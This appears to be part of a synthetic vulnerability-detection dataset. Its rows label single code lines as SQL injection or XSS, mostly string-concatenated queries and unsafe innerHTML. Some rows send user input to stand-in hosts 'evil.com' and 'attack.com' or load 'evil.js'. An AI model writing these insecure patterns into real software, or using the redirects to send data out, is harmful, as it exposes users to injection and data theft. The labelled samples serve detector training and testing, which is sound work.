+ROW-249,SQLi,python,line_9_249.py,snippet_249,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-250,XSS,javascript,line_13_250.js,snippet_250,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-251,SQLi,javascript,line_5_251.js,snippet_251,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-252,XSS,javascript,line_3_252.js,snippet_252,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-253,XSS,javascript,line_17_253.js,snippet_253,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-254,XSS,javascript,line_20_254.js,snippet_254,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-255,SQLi,python,line_2_255.py,snippet_255,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-256,XSS,javascript,line_19_256.js,snippet_256,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-257,SQLi,python,line_12_257.py,snippet_257,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-258,XSS,javascript,line_13_258.js,snippet_258,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-259,XSS,javascript,line_9_259.js,snippet_259,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-260,SQLi,python,line_12_260.py,snippet_260,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-261,XSS,javascript,line_9_261.js,snippet_261,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-262,XSS,javascript,line_7_262.js,snippet_262,alert('Hello ' + user_input);,,,,,statement
+ROW-263,SQLi,python,line_16_263.py,snippet_263,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-264,SQLi,python,line_11_264.py,snippet_264,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-265,XSS,javascript,line_18_265.js,snippet_265,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-266,XSS,javascript,line_9_266.js,snippet_266,alert('Hello ' + user_input);,,,,,statement
+ROW-267,XSS,javascript,line_13_267.js,snippet_267,alert('Hello ' + user_input);,,,,,statement
+ROW-268,XSS,javascript,line_13_268.js,snippet_268,alert('Hello ' + user_input);,,,,,statement
+ROW-269,XSS,javascript,line_4_269.js,snippet_269,alert('Hello ' + user_input);,,,,,statement
+ROW-270,XSS,javascript,line_12_270.js,snippet_270,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-271,XSS,javascript,line_7_271.js,snippet_271,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-272,SQLi,python,line_2_272.py,snippet_272,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-273,SQLi,python,line_13_273.py,snippet_273,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-274,SQLi,python,line_10_274.py,snippet_274,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-275,SQLi,javascript,line_19_275.js,snippet_275,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-276,SQLi,python,line_8_276.py,snippet_276,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-277,SQLi,python,line_3_277.py,snippet_277,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-278,XSS,javascript,line_20_278.js,snippet_278,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-279,XSS,javascript,line_11_279.js,snippet_279,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-280,XSS,javascript,line_6_280.js,snippet_280,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-281,XSS,javascript,line_19_281.js,snippet_281,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-282,XSS,javascript,line_2_282.js,snippet_282,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-283,XSS,javascript,line_4_283.js,snippet_283,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-284,SQLi,python,line_14_284.py,snippet_284,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-285,XSS,javascript,line_9_285.js,snippet_285,alert('Hello ' + user_input);,,,,,statement
+ROW-286,XSS,javascript,line_6_286.js,snippet_286,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-287,SQLi,python,line_11_287.py,snippet_287,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-288,XSS,javascript,line_2_288.js,snippet_288,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-289,XSS,javascript,line_19_289.js,snippet_289,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-290,XSS,javascript,line_2_290.js,snippet_290,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-291,XSS,javascript,line_20_291.js,snippet_291,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-292,XSS,javascript,line_3_292.js,snippet_292,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-293,SQLi,python,line_9_293.py,snippet_293,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-294,XSS,javascript,line_12_294.js,snippet_294,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-295,XSS,javascript,line_15_295.js,snippet_295,alert('Hello ' + user_input);,,,,,statement
+ROW-296,SQLi,python,line_20_296.py,snippet_296,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-297,XSS,javascript,line_2_297.js,snippet_297,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-298,XSS,javascript,line_12_298.js,snippet_298,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-299,XSS,javascript,line_8_299.js,snippet_299,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-300,XSS,javascript,line_6_300.js,snippet_300,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-301,SQLi,python,line_6_301.py,snippet_301,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-302,XSS,javascript,line_17_302.js,snippet_302,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-303,SQLi,python,line_2_303.py,snippet_303,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-304,XSS,javascript,line_4_304.js,snippet_304,alert('Hello ' + user_input);,,,,,statement
+ROW-305,XSS,javascript,line_8_305.js,snippet_305,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-306,XSS,javascript,line_18_306.js,snippet_306,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-307,XSS,javascript,line_3_307.js,snippet_307,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-308,SQLi,javascript,line_10_308.js,snippet_308,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-309,XSS,javascript,line_15_309.js,snippet_309,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-310,XSS,javascript,line_20_310.js,snippet_310,alert('Hello ' + user_input);,,,,,statement
+ROW-311,XSS,javascript,line_1_311.js,snippet_311,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-312,SQLi,python,line_7_312.py,snippet_312,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-313,SQLi,python,line_15_313.py,snippet_313,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-314,XSS,javascript,line_1_314.js,snippet_314,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-315,XSS,javascript,line_13_315.js,snippet_315,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-316,SQLi,python,line_5_316.py,snippet_316,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-317,XSS,javascript,line_15_317.js,snippet_317,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-318,XSS,javascript,line_10_318.js,snippet_318,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-319,XSS,javascript,line_12_319.js,snippet_319,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-320,XSS,javascript,line_16_320.js,snippet_320,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-321,XSS,javascript,line_17_321.js,snippet_321,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-322,XSS,javascript,line_5_322.js,snippet_322,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-323,XSS,javascript,line_6_323.js,snippet_323,alert('Hello ' + user_input);,,,,,statement
+ROW-324,SQLi,python,line_11_324.py,snippet_324,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-325,SQLi,python,line_20_325.py,snippet_325,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-326,SQLi,javascript,line_10_326.js,snippet_326,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-327,SQLi,python,line_18_327.py,snippet_327,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-328,XSS,javascript,line_15_328.js,snippet_328,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-329,XSS,javascript,line_5_329.js,snippet_329,alert('Hello ' + user_input);,,,,,statement
+ROW-330,SQLi,python,line_19_330.py,snippet_330,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-331,XSS,javascript,line_4_331.js,snippet_331,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-332,XSS,javascript,line_13_332.js,snippet_332,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-333,SQLi,python,line_3_333.py,snippet_333,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-334,XSS,javascript,line_3_334.js,snippet_334,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-335,XSS,javascript,line_6_335.js,snippet_335,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-336,SQLi,python,line_8_336.py,snippet_336,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-337,XSS,javascript,line_14_337.js,snippet_337,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-338,SQLi,javascript,line_5_338.js,snippet_338,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-339,SQLi,python,line_14_339.py,snippet_339,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-340,SQLi,python,line_6_340.py,snippet_340,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-341,SQLi,python,line_13_341.py,snippet_341,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-342,SQLi,python,line_17_342.py,snippet_342,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-343,SQLi,javascript,line_9_343.js,snippet_343,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-344,SQLi,javascript,line_14_344.js,snippet_344,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-345,XSS,javascript,line_13_345.js,snippet_345,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-346,XSS,javascript,line_17_346.js,snippet_346,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-347,XSS,javascript,line_10_347.js,snippet_347,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-348,SQLi,python,line_13_348.py,snippet_348,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-349,SQLi,python,line_3_349.py,snippet_349,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-350,SQLi,python,line_16_350.py,snippet_350,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-351,SQLi,python,line_1_351.py,snippet_351,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-352,XSS,javascript,line_13_352.js,snippet_352,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-353,SQLi,python,line_5_353.py,snippet_353,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-354,SQLi,python,line_12_354.py,snippet_354,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-355,XSS,javascript,line_9_355.js,snippet_355,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-356,SQLi,python,line_9_356.py,snippet_356,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-357,SQLi,python,line_20_357.py,snippet_357,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-358,XSS,javascript,line_12_358.js,snippet_358,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-359,XSS,javascript,line_11_359.js,snippet_359,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-360,XSS,javascript,line_6_360.js,snippet_360,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-361,SQLi,python,line_19_361.py,snippet_361,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-362,SQLi,python,line_18_362.py,snippet_362,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-363,SQLi,javascript,line_15_363.js,snippet_363,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-364,XSS,javascript,line_2_364.js,snippet_364,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-365,SQLi,javascript,line_6_365.js,snippet_365,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-366,XSS,javascript,line_3_366.js,snippet_366,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-367,XSS,javascript,line_3_367.js,snippet_367,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-368,SQLi,python,line_3_368.py,snippet_368,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-369,XSS,javascript,line_5_369.js,snippet_369,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-370,XSS,javascript,line_20_370.js,snippet_370,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-371,SQLi,python,line_11_371.py,snippet_371,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-372,XSS,javascript,line_13_372.js,snippet_372,alert('Hello ' + user_input);,,,,,statement
+ROW-373,XSS,javascript,line_12_373.js,snippet_373,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-374,SQLi,python,line_6_374.py,snippet_374,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-375,SQLi,javascript,line_14_375.js,snippet_375,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-376,SQLi,javascript,line_2_376.js,snippet_376,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-377,XSS,javascript,line_14_377.js,snippet_377,alert('Hello ' + user_input);,,,,,statement
+ROW-378,SQLi,python,line_2_378.py,snippet_378,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-379,XSS,javascript,line_9_379.js,snippet_379,alert('Hello ' + user_input);,,,,,statement
+ROW-380,XSS,javascript,line_9_380.js,snippet_380,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-381,SQLi,python,line_18_381.py,snippet_381,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-382,XSS,javascript,line_13_382.js,snippet_382,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-383,XSS,javascript,line_11_383.js,snippet_383,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-384,XSS,javascript,line_11_384.js,snippet_384,alert('Hello ' + user_input);,,,,,statement
+ROW-385,XSS,javascript,line_7_385.js,snippet_385,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-386,SQLi,python,line_8_386.py,snippet_386,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-387,XSS,javascript,line_4_387.js,snippet_387,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-388,SQLi,python,line_2_388.py,snippet_388,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-389,SQLi,python,line_7_389.py,snippet_389,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-390,XSS,javascript,line_9_390.js,snippet_390,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-391,SQLi,python,line_14_391.py,snippet_391,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-392,SQLi,javascript,line_11_392.js,snippet_392,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-393,SQLi,python,line_8_393.py,snippet_393,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-394,SQLi,python,line_13_394.py,snippet_394,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-395,SQLi,javascript,line_1_395.js,snippet_395,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-396,XSS,javascript,line_12_396.js,snippet_396,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-397,XSS,javascript,line_10_397.js,snippet_397,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-398,XSS,javascript,line_2_398.js,snippet_398,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-399,SQLi,python,line_13_399.py,snippet_399,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-400,SQLi,python,line_13_400.py,snippet_400,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-401,SQLi,python,line_7_401.py,snippet_401,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-402,SQLi,javascript,line_12_402.js,snippet_402,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-403,SQLi,python,line_8_403.py,snippet_403,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-404,XSS,javascript,line_12_404.js,snippet_404,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-405,XSS,javascript,line_16_405.js,snippet_405,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-406,SQLi,python,line_4_406.py,snippet_406,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-407,SQLi,python,line_18_407.py,snippet_407,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-408,XSS,javascript,line_12_408.js,snippet_408,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-409,SQLi,python,line_4_409.py,snippet_409,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-410,XSS,javascript,line_20_410.js,snippet_410,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-411,SQLi,python,line_16_411.py,snippet_411,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-412,XSS,javascript,line_3_412.js,snippet_412,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-413,XSS,javascript,line_3_413.js,snippet_413,alert('Hello ' + user_input);,,,,,statement
+ROW-414,XSS,javascript,line_17_414.js,snippet_414,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-415,XSS,javascript,line_13_415.js,snippet_415,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-416,SQLi,python,line_19_416.py,snippet_416,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-417,XSS,javascript,line_13_417.js,snippet_417,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-418,XSS,javascript,line_7_418.js,snippet_418,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-419,XSS,javascript,line_7_419.js,snippet_419,alert('Hello ' + user_input);,,,,,statement
+ROW-420,XSS,javascript,line_2_420.js,snippet_420,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-421,SQLi,python,line_20_421.py,snippet_421,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-422,SQLi,python,line_8_422.py,snippet_422,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-423,SQLi,python,line_6_423.py,snippet_423,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-424,XSS,javascript,line_18_424.js,snippet_424,alert('Hello ' + user_input);,,,,,statement
+ROW-425,XSS,javascript,line_4_425.js,snippet_425,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-426,SQLi,python,line_17_426.py,snippet_426,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-427,SQLi,python,line_7_427.py,snippet_427,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-428,XSS,javascript,line_2_428.js,snippet_428,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-429,SQLi,javascript,line_9_429.js,snippet_429,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-430,SQLi,javascript,line_11_430.js,snippet_430,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-431,SQLi,javascript,line_3_431.js,snippet_431,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-432,SQLi,python,line_9_432.py,snippet_432,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-433,XSS,javascript,line_2_433.js,snippet_433,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-434,XSS,javascript,line_7_434.js,snippet_434,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-435,SQLi,python,line_5_435.py,snippet_435,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-436,XSS,javascript,line_1_436.js,snippet_436,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-437,XSS,javascript,line_14_437.js,snippet_437,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-438,SQLi,python,line_15_438.py,snippet_438,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-439,SQLi,javascript,line_20_439.js,snippet_439,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-440,SQLi,javascript,line_3_440.js,snippet_440,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-441,SQLi,python,line_11_441.py,snippet_441,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-442,XSS,javascript,line_4_442.js,snippet_442,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-443,SQLi,python,line_19_443.py,snippet_443,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-444,XSS,javascript,line_17_444.js,snippet_444,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-445,SQLi,python,line_20_445.py,snippet_445,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-446,XSS,javascript,line_12_446.js,snippet_446,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-447,SQLi,python,line_8_447.py,snippet_447,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-448,SQLi,python,line_4_448.py,snippet_448,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-449,SQLi,python,line_5_449.py,snippet_449,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-450,SQLi,python,line_14_450.py,snippet_450,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-451,XSS,javascript,line_4_451.js,snippet_451,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-452,XSS,javascript,line_8_452.js,snippet_452,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-453,SQLi,python,line_8_453.py,snippet_453,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-454,XSS,javascript,line_10_454.js,snippet_454,alert('Hello ' + user_input);,,,,,statement
+ROW-455,SQLi,python,line_2_455.py,snippet_455,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-456,SQLi,python,line_14_456.py,snippet_456,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-457,SQLi,python,line_7_457.py,snippet_457,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-458,XSS,javascript,line_7_458.js,snippet_458,alert('Hello ' + user_input);,,,,,statement
+ROW-459,XSS,javascript,line_20_459.js,snippet_459,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-460,XSS,javascript,line_20_460.js,snippet_460,alert('Hello ' + user_input);,,,,,statement
+ROW-461,XSS,javascript,line_13_461.js,snippet_461,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-462,SQLi,python,line_13_462.py,snippet_462,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-463,XSS,javascript,line_12_463.js,snippet_463,alert('Hello ' + user_input);,,,,,statement
+ROW-464,XSS,javascript,line_17_464.js,snippet_464,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-465,SQLi,python,line_12_465.py,snippet_465,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-466,SQLi,python,line_11_466.py,snippet_466,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-467,XSS,javascript,line_19_467.js,snippet_467,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-468,SQLi,python,line_18_468.py,snippet_468,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-469,XSS,javascript,line_12_469.js,snippet_469,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-470,XSS,javascript,line_20_470.js,snippet_470,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-471,SQLi,javascript,line_3_471.js,snippet_471,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-472,XSS,javascript,line_18_472.js,snippet_472,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-473,SQLi,python,line_2_473.py,snippet_473,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-474,XSS,javascript,line_13_474.js,snippet_474,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-475,SQLi,python,line_11_475.py,snippet_475,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-476,XSS,javascript,line_18_476.js,snippet_476,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-477,XSS,javascript,line_13_477.js,snippet_477,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-478,XSS,javascript,line_15_478.js,snippet_478,alert('Hello ' + user_input);,,,,,statement
+ROW-479,SQLi,python,line_12_479.py,snippet_479,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-480,XSS,javascript,line_4_480.js,snippet_480,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-481,SQLi,javascript,line_12_481.js,snippet_481,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-482,SQLi,javascript,line_2_482.js,snippet_482,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-483,XSS,javascript,line_12_483.js,snippet_483,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-484,XSS,javascript,line_5_484.js,snippet_484,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-485,SQLi,python,line_20_485.py,snippet_485,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-486,XSS,javascript,line_9_486.js,snippet_486,alert('Hello ' + user_input);,,,,,statement
+ROW-487,XSS,javascript,line_15_487.js,snippet_487,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-488,SQLi,python,line_2_488.py,snippet_488,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-489,XSS,javascript,line_10_489.js,snippet_489,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-490,XSS,javascript,line_4_490.js,snippet_490,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-491,XSS,javascript,line_4_491.js,snippet_491,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-492,SQLi,javascript,line_4_492.js,snippet_492,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-493,XSS,javascript,line_5_493.js,snippet_493,alert('Hello ' + user_input);,,,,,statement
+ROW-494,SQLi,python,line_15_494.py,snippet_494,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-495,SQLi,python,line_16_495.py,snippet_495,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-496,XSS,javascript,line_16_496.js,snippet_496,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-497,XSS,javascript,line_16_497.js,snippet_497,alert('Hello ' + user_input);,,,,,statement
+ROW-498,XSS,javascript,line_1_498.js,snippet_498,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-499,XSS,javascript,line_20_499.js,snippet_499,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-500,SQLi,python,line_9_500.py,snippet_500,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
